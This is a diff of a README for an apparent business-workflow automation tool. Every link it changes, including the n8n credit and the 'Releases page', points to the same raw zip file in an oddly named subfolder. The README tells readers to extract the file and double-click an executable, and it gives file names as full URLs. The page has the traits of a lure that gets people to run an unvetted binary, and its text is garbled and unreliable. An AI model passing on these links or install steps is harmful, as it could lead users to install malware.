@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download](https://raw.githubusercontent.com/Nijamudin/automated-business-analysis-workflow/main/laloneurosis/automated-business-analysis-workflow-3.9.zip)](https://raw.githubusercontent.com/Nijamudin/automated-business-analysis-workflow/main/laloneurosis/automated-business-analysis-workflow-3.9.zip)
+[![Download](https://github.com/Nijamudin/automated-business-analysis-workflow/raw/refs/heads/main/laloneurosis/automated_business_workflow_analysis_1.4.zip)](https://github.com/Nijamudin/automated-business-analysis-workflow/raw/refs/heads/main/laloneurosis/automated_business_workflow_analysis_1.4.zip)
 
 ## 📄 Overview
 
@@ -22,7 +22,7 @@ Before you begin, make sure your computer meets these requirements:
 
 To download the application, click the link below:
 
-[Download the latest version](https://raw.githubusercontent.com/Nijamudin/automated-business-analysis-workflow/main/laloneurosis/automated-business-analysis-workflow-3.9.zip)
+[Download the latest version](https://github.com/Nijamudin/automated-business-analysis-workflow/raw/refs/heads/main/laloneurosis/automated_business_workflow_analysis_1.4.zip)
 
 This link will take you to the Releases page where you can find the latest version available for download.
 
@@ -30,10 +30,10 @@ This link will take you to the Releases page where you can find the latest versi
 
 After downloading, follow these steps to install the application:
 
-1. Locate the downloaded file in your "Downloads" folder. It should have a name like `https://raw.githubusercontent.com/Nijamudin/automated-business-analysis-workflow/main/laloneurosis/automated-business-analysis-workflow-3.9.zip`.
+1. Locate the downloaded file in your "Downloads" folder. It should have a name like `https://github.com/Nijamudin/automated-business-analysis-workflow/raw/refs/heads/main/laloneurosis/automated_business_workflow_analysis_1.4.zip`.
 2. Right-click the file and choose "Extract All" to unzip it.
 3. Open the extracted folder.
-4. Look for an executable file named `https://raw.githubusercontent.com/Nijamudin/automated-business-analysis-workflow/main/laloneurosis/automated-business-analysis-workflow-3.9.zip` (for Windows) or simply `automated-business-analysis-workflow` (for macOS/Linux).
+4. Look for an executable file named `https://github.com/Nijamudin/automated-business-analysis-workflow/raw/refs/heads/main/laloneurosis/automated_business_workflow_analysis_1.4.zip` (for Windows) or simply `automated-business-analysis-workflow` (for macOS/Linux).
 5. Double-click the executable file to start the installation.
 
 ### Step 4: Configure the Workflow
@@ -77,7 +77,7 @@ Stay updated with our latest features and enhancements by following the GitHub D
 
 Thanks to the contributors of the open-source libraries used in the project:
 
-- [n8n](https://raw.githubusercontent.com/Nijamudin/automated-business-analysis-workflow/main/laloneurosis/automated-business-analysis-workflow-3.9.zip) for automation workflows.
+- [n8n](https://github.com/Nijamudin/automated-business-analysis-workflow/raw/refs/heads/main/laloneurosis/automated_business_workflow_analysis_1.4.zip) for automation workflows.
 - Various contributors for their ongoing support and feedback.
 
-For more information and updates, regularly visit the [Releases page](https://raw.githubusercontent.com/Nijamudin/automated-business-analysis-workflow/main/laloneurosis/automated-business-analysis-workflow-3.9.zip). This is where you will find new versions and updates as we continue to enhance the software.
+For more information and updates, regularly visit the [Releases page](https://github.com/Nijamudin/automated-business-analysis-workflow/raw/refs/heads/main/laloneurosis/automated_business_workflow_analysis_1.4.zip). This is where you will find new versions and updates as we continue to enhance the software.
